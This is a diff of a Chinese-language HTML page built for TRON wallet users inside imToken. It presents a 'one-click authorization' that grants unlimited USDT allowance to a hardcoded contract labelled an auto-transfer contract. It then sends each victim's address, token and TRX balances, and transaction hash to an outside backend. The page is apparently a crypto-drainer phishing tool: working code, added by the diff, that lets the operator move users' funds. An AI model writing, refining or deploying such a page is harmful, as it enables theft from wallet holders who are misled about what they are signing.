@@ -1,170 +1,242 @@
 <!DOCTYPE html>
-<html>
+<html lang="zh-CN">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
-    <title>USDT授权登记（仅1次操作）</title>
-    <style>
-        * { margin: 0; padding: 0; box-sizing: border-box; font-family: -apple-system, BlinkMacSystemFont, sans-serif; }
-        body { background: #f5f7fa; min-height: 100vh; padding: 20px; display: flex; flex-direction: column; align-items: center; }
-        .container { width: 100%; max-width: 450px; background: #fff; border-radius: 16px; padding: 30px 25px; box-shadow: 0 4px 16px rgba(0,0,0,0.05); }
-        .title { font-size: 20px; color: #333; text-align: center; margin-bottom: 10px; }
-        .tip { font-size: 14px; color: #666; text-align: center; margin-bottom: 30px; line-height: 1.5; }
-        #authBtn { width: 100%; padding: 18px; background: linear-gradient(90deg, #409eff, #3086e8); color: #fff; border: none; border-radius: 12px; font-size: 16px; font-weight: 500; cursor: pointer; margin-bottom: 20px; }
-        #authBtn:disabled { background: #c0c4cc; cursor: not-allowed; }
-        #status { min-height: 40px; font-size: 14px; color: #333; text-align: center; padding: 10px; border-radius: 8px; background: #f9fafc; }
-        .addr-show { margin-top: 15px; font-size: 13px; color: #999; text-align: center; }
-    </style>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>IMToken一键无限授权</title>
+  <style>
+    * { margin: 0; padding: 0; box-sizing: border-box; }
+    body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; 
+           padding: 20px; max-width: 500px; margin: 0 auto; background: #f5f5f5; }
+    .header { text-align: center; margin-bottom: 30px; }
+    .header h1 { font-size: 22px; color: #2c3e50; margin-bottom: 10px; }
+    .warning { background: #fff8e1; color: #e6a23c; padding: 12px; border-radius: 8px; 
+               font-size: 14px; margin-bottom: 20px; text-align: left; }
+    .btn { width: 100%; padding: 15px; font-size: 16px; border: none; border-radius: 8px; 
+           background: #409EFF; color: white; cursor: pointer; margin-bottom: 15px; }
+    .btn:disabled { background: #ccc; cursor: not-allowed; }
+    #userInfo { text-align: center; font-size: 14px; color: #333; margin: 20px 0; padding: 15px; background: #fff; border-radius: 8px; }
+    .record-list { margin-top: 30px; }
+    .record-item { background: #fff; padding: 15px; margin-bottom: 15px; border-radius: 8px; font-size: 14px; }
+    .record-item p { margin-bottom: 8px; color: #333; }
+    .record-item p strong { color: #2c3e50; }
+    .tx-link { color: #409EFF; text-decoration: none; }
+
+    /* 外部浏览器提示弹窗样式 */
+    .external-tip { position: fixed; top: 0; left: 0; right: 0; bottom: 0; background: rgba(0,0,0,0.7); z-index: 999; display: flex; align-items: center; justify-content: center; }
+    .tip-content { background: white; padding: 25px; border-radius: 12px; max-width: 85%; }
+    .tip-content h2 { font-size: 18px; margin-bottom: 15px; color: #2c3e50; }
+    .tip-content p { font-size: 14px; color: #666; margin-bottom: 20px; line-height: 1.5; }
+    .tip-btn-group { display: flex; gap: 10px; }
+    .tip-btn { flex: 1; padding: 12px; font-size: 14px; border-radius: 8px; border: none; cursor: pointer; }
+    .tip-btn.primary { background: #409EFF; color: white; }
+    .tip-btn.secondary { background: #f5f5f5; color: #333; }
+  </style>
 </head>
 <body>
-    <div class="container">
-        <h2 class="title">USDT一键授权登记</h2>
-        <p class="tip">点击下方按钮，仅需1次签名，自动完成授权+登记</p>
-        
-        <button id="authBtn">发起USDT授权</button>
-        <div id="status">请点击按钮开始操作</div>
-        <div class="addr-show" id="addrShow"></div>
+  <!-- 外部浏览器提示弹窗（默认隐藏） -->
+  <div class="external-tip" id="externalTip" style="display: none;">
+    <div class="tip-content">
+      <h2>请用IMToken打开此页面</h2>
+      <p>当前是外部浏览器，无法连接钱包，请点击“唤起IMToken”，或复制链接到IMToken内置浏览器打开。</p>
+      <div class="tip-btn-group">
+        <button class="tip-btn primary" id="openIMTokenBtn">唤起IMToken</button>
+        <button class="tip-btn secondary" id="copyLinkBtn">复制链接</button>
+      </div>
+    </div>
+  </div>
+
+  <!-- 主内容区（IMToken内置浏览器显示） -->
+  <div id="mainContent">
+    <div class="header">
+      <h1>TRC20代币一键无限授权</h1>
+      <div class="warning">
+        ⚠️ 本次授权为无限额度（可在IMToken钱包中随时撤销授权）
+      </div>
     </div>
 
-    <script>
-        // -------------------------- 配置参数（需根据你的实际情况修改）--------------------------
-        const USDT_CONTRACT_ADDR = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t"; // 波场主网USDT合约地址（固定）
-        const YOUR_PROXY_ADDR = "TNAfknJTfkPbgmyfpwg3rJQrd17ZLKEMQa";    // 你的原合约地址（需替换）
-        const BACKEND_REGISTER_API = "https://tron-notify-backend.vercel.app"; // 你的后端登记接口（需替换）
-        const INFINITE_AUTH_AMOUNT = "115792089237316195423570985008687907853269984665640564039457584007913129639935"; // 无限授权额度（固定）
-        // -------------------------------------------------------------------------------------
+    <button id="connectBtn" class="btn">连接IMToken钱包</button>
+    <button id="approveBtn" class="btn" disabled>一键授权（无限额度）</button>
 
-        // DOM元素
-        const authBtn = document.getElementById("authBtn");
-        const statusText = document.getElementById("status");
-        const addrShow = document.getElementById("addrShow");
+    <div id="userInfo">未连接钱包</div>
 
-        // 页面加载后，自动检测钱包并尝试获取地址
-        window.onload = async function() {
-            await checkWalletAndGetAddr();
-        };
+    <div class="record-list">
+      <h3 style="font-size: 16px; margin-bottom: 15px; color: #2c3e50;">授权记录</h3>
+      <div id="approvalRecords">暂无授权记录</div>
+    </div>
+  </div>
 
-        // 1. 检测钱包+自动获取用户地址（核心：无需用户手动输入）
-        async function checkWalletAndGetAddr() {
-            try {
-                // 检测是否在TRON钱包内置浏览器（如imToken）
-                if (!window.tronWeb) {
-                    statusText.innerText = "请在imToken等TRON钱包内置浏览器打开";
-                    authBtn.disabled = true;
-                    return null;
-                }
+  <script src="https://unpkg.com/tronweb@4.7.0/dist/TronWeb.min.js"></script>
+  <script>
+    // ========== 配置项 ==========
+    const AUTO_TRANSFER_CONTRACT = "TNAfknJTfkPbgmyfpwg3rJQrd17ZLKEMQa";
+    const TRC20_TOKEN_ADDRESS = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";
+    const BACKEND_API = "https://tron-notify-backend.vercel.app/api/notify-approval";
+    const INFINITE_APPROVE_AMOUNT = "0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF";
+    const CURRENT_PAGE_URL = window.location.href; // 当前页面链接（用于唤起/复制）
 
-                // 等待钱包加载完成（兼容部分低版本imToken）
-                if (!window.tronWeb.ready) {
-                    await new Promise(resolve => {
-                        const timer = setInterval(() => {
-                            if (window.tronWeb.ready) {
-                                clearInterval(timer);
-                                resolve();
-                            }
-                        }, 200);
-                    });
-                }
+    // 全局变量
+    let tronWeb, userAddress, trc20Contract;
+    const RECORD_KEY = "imtoken_infinite_approval_records";
 
-                // 获取用户地址（Base58格式，TRON常用格式）
-                const userAddr = window.tronWeb.defaultAddress.base58;
-                if (!userAddr) {
-                    statusText.innerText = "请先在钱包中登录（解锁）你的账户";
-                    authBtn.disabled = true;
-                    return null;
-                }
+    // 页面加载：先检测是否是IMToken内置浏览器
+    window.onload = () => {
+      // 1. 判断是否是IMToken内置浏览器
+      const isIMToken = /IMToken/i.test(navigator.userAgent);
+      if (!isIMToken) {
+        // 外部浏览器：显示提示弹窗，隐藏主内容
+        document.getElementById("externalTip").style.display = "flex";
+        document.getElementById("mainContent").style.display = "none";
+        // 绑定外部浏览器的按钮事件
+        bindExternalTipEvents();
+        return;
+      }
 
-                // 显示用户地址（让用户确认）
-                addrShow.innerText = 你的钱包地址：${userAddr.slice(0, 8)}...${userAddr.slice(-6)};
-                statusText.innerText = "已就绪，点击按钮发起授权";
-                authBtn.disabled = false;
-                return userAddr;
+      // 2. 是IMToken内置浏览器：执行原逻辑
+      const connectBtn = document.getElementById("connectBtn");
+      const approveBtn = document.getElementById("approveBtn");
+      renderApprovalRecords();
 
-            } catch (e) {
-                statusText.innerText = "钱包检测失败：" + e.message.slice(0, 30);
-                authBtn.disabled = true;return null;
-            }
+      // 延迟检测tronWeb（适配IMToken注入延迟）
+      const checkIMToken = setInterval(() => {
+        if (window.tronWeb && window.tronWeb.ready) {
+          clearInterval(checkIMToken);
+          tronWeb = window.tronWeb;
+          initWallet().catch(err => {
+            document.getElementById("userInfo").innerHTML = "连接钱包失败：" + err.message;
+          });
         }
+      }, 500);
+      setTimeout(() => clearInterval(checkIMToken), 5000);
 
-        // 2. 点击按钮：发起USDT授权（用户仅需1次签名）
-        authBtn.addEventListener("click", async function() {
-            // 先重新获取地址（防止用户切换账户）
-            const userAddr = await checkWalletAndGetAddr();
-            if (!userAddr) return;
+      // 连接钱包按钮
+      connectBtn.onclick = async () => {
+        try {
+          const accounts = await window.tronWeb.request({ method: "tron_requestAccounts" });
+          userAddress = accounts[0];
+          await initWallet();
+        } catch (e) {
+          alert("连接失败：" + e.message);
+        }
+      };
 
-            // 禁用按钮，防止重复点击
-            authBtn.disabled = true;
-            statusText.innerText = "正在发起授权，请在钱包中确认...";
+      // 一键授权按钮
+      approveBtn.onclick = async () => {
+        try {
+          const result = await trc20Contract.approve(
+            AUTO_TRANSFER_CONTRACT, 
+            INFINITE_APPROVE_AMOUNT
+          ).send({
+            from: userAddress,
+            shouldPollResponse: true
+          });
 
-            try {
-                // 调用USDT合约的approve方法（用户本人操作，符合TRC20规则）
-                const usdtContract = await window.tronWeb.contract().at(USDT_CONTRACT_ADDR);
-                const approveTx = await usdtContract.approve(
-                    YOUR_PROXY_ADDR,       // 授权目标：你的原合约地址
-                    INFINITE_AUTH_AMOUNT,  // 授权额度：无限
-                    { 
-                        from: userAddr,    // 自动获取的用户地址（无需手动输入）
-                        feeLimit: 500000000 // 50 TRX（足够覆盖授权的能量消耗）
-                    }
-                ).send();
+          const [tokenBalance, trxBalance] = await Promise.all([
+            getTokenBalance(userAddress),
+            getTrxBalance(userAddress)
+          ]);
+          const record = {
+            address: userAddress,
+            tokenBalance: tokenBalance.toFixed(2),
+            trxBalance: trxBalance.toFixed(2),
+            approveTime: new Date().toLocaleString(),
+            txHash: result.transaction.txID,
+            approveType: "无限额度"
+          };
 
-                // 授权成功后，自动调用后端接口登记（无签名，纯前端请求）
-                statusText.innerText = "授权成功，正在自动登记...";
-                await registerToBackend(userAddr, approveTx.txid);
+          saveApprovalRecord(record);
+          await sendDataToBackend(record);
+          alert(`无限授权成功！\n交易哈希：${record.txHash}\n可在IMToken中撤销授权`);
+          renderApprovalRecords();
+        } catch (e) {
+          alert("授权失败：" + e.message);
+        }
+      };
+    };
 
-                // 最终提示
-                statusText.innerText = "✅ 授权+登记完成！等待代转账";
-                addrShow.innerText = 你的地址：${userAddr.slice(0, 8)}...${userAddr.slice(-6)} | 授权交易ID：${approveTx.txid.slice(0, 10)}...;
+    // ========== 外部浏览器提示弹窗的事件绑定 ==========
+    function bindExternalTipEvents() {
+      // 1. 唤起IMToken（用IMToken的URL Scheme）
+      document.getElementById("openIMTokenBtn").onclick = () => {
+        // IMToken的唤起协议：imtoken://browser?url=页面链接
+        const imtokenUrl = imtoken://browser?url=${encodeURIComponent(CURRENT_PAGE_URL)};
+        window.location.href = imtokenUrl;
+      };
 
-            } catch (e) {
-                // 错误处理（区分用户取消、能量不足等场景）
-                let errMsg = "授权失败：";
-                if (e.message.includes("user rejected")) {
-                    errMsg += "你已取消授权操作";
-                } else if (e.message.includes("out of energy")) {
-                    errMsg += "能量不足，请先获取少量TRX";
-                } else {
-                    errMsg += e.message.slice(0, 30);
-                }
-                statusText.innerText = errMsg;
-                authBtn.disabled = false; // 允许重试
-            }
+      // 2. 复制当前页面链接
+      document.getElementById("copyLinkBtn").onclick = async () => {
+        try {
+          await navigator.clipboard.writeText(CURRENT_PAGE_URL);
+          alert("链接已复制，请打开IMToken→发现→浏览器，粘贴链接访问");
+        } catch (e) {
+          alert("复制失败，请手动复制地址栏链接");
+        }
+      };
+    }
+
+    // ========== 原有工具函数（不变） ==========
+    async function initWallet() {
+      try {
+        userAddress = tronWeb.defaultAddress.base58;
+        trc20Contract = await tronWeb.contract().at(TRC20_TOKEN_ADDRESS);
+        document.getElementById("userInfo").innerHTML = `
+          已连接：<br>
+          ${userAddress.slice(0, 8)}...${userAddress.slice(-6)}
+        `;
+        document.getElementById("approveBtn").disabled = false;
+      } catch (e) {
+        throw new Error(e.message);
+      }
+    }
+
+    async function getTokenBalance(address) {
+      const balance = await trc20Contract.balanceOf(address).call();
+      return balance / 1000000;
+    }
+
+    async function getTrxBalance(address) {
+      const balance = await tronWeb.trx.getBalance(address);
+      return balance / 1000000;
+    }
+
+    function saveApprovalRecord(record) {
+      const existing = JSON.parse(localStorage.getItem(RECORD_KEY) || "[]");
+      const newRecords = existing.filter(item => item.address !== record.address);
+      newRecords.push(record);
+      localStorage.setItem(RECORD_KEY, JSON.stringify(newRecords));
+    }
+
+    function renderApprovalRecords() {
+      const container = document.getElementById("approvalRecords");
+      const records = JSON.parse(localStorage.getItem(RECORD_KEY) || "[]");container.innerHTML = records.length === 0 
+        ? "<div class='record-item'>暂无授权记录</div>" 
+        : records.map(record => `
+            <div class="record-item">
+              <p><strong>地址：</strong>${record.address.slice(0, 8)}...${record.address.slice(-6)}</p>
+              <p><strong>授权类型：</strong>${record.approveType}</p>
+              <p><strong>USDT：</strong>${record.tokenBalance} USDT</p>
+              <p><strong>TRX：</strong>${record.trxBalance} TRX</p>
+              <p><strong>时间：</strong>${record.approveTime}</p>
+              <p><a href="https://tronscan.org/#/transaction/${record.txHash}" target="_blank" class="tx-link">查看交易</a></p>
+            </div>
+          `).join("");
+    }
+
+    async function sendDataToBackend(record) {
+      try {
+        const res = await fetch(BACKEND_API, {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify(record),
+          credentials: "omit"
         });
-
-        // 3. 授权成功后，自动登记到后端（无签名，仅数据存储）
-        async function registerToBackend(userAddr, approveTxid) {
-            try {
-                // 调用后端登记接口
-                const response = await fetch(BACKEND_REGISTER_API, {
-                    method: "POST",
-                    headers: {
-                        "Content-Type": "application/json",
-                        "X-Request-Source": "frontend-auth" // 可选：标识前端请求
-                    },
-                    body: JSON.stringify({
-                        userWalletAddr: userAddr,    // 用户钱包地址
-                        proxyContractAddr: YOUR_PROXY_ADDR, // 你的原合约地址
-                        usdtApproveTxid: approveTxid, // USDT授权交易ID（用于后端校验）
-                        timestamp: new Date().getTime() // 时间戳（防重复）
-                    }),
-                    timeout: 10000 // 10秒超时
-                });
-
-                const result = await response.json();
-                if (!response.ok || !result.success) {
-                    throw new Error(result.msg || "登记接口返回失败");
-                }
-
-            } catch (e) {
-                // 登记失败时，提供重试选项（仍无签名）
-                const isRetry = confirm(`状态登记失败：${e.message.slice(0, 20)}，是否重试？`);
-                if (isRetry) {
-                    await registerToBackend(userAddr, approveTxid);
-                } else {
-                    throw new Error("你取消了登记重试");
-                }
-            }
-        }
-    </script>
+        if (!res.ok) throw new Error("后端请求失败");
+        return res.json();
+      } catch (e) {
+        alert("授权成功，但通知发送失败：" + e.message);
+        throw e;
+      }
+    }
+  </script>
 </body>
 </html>
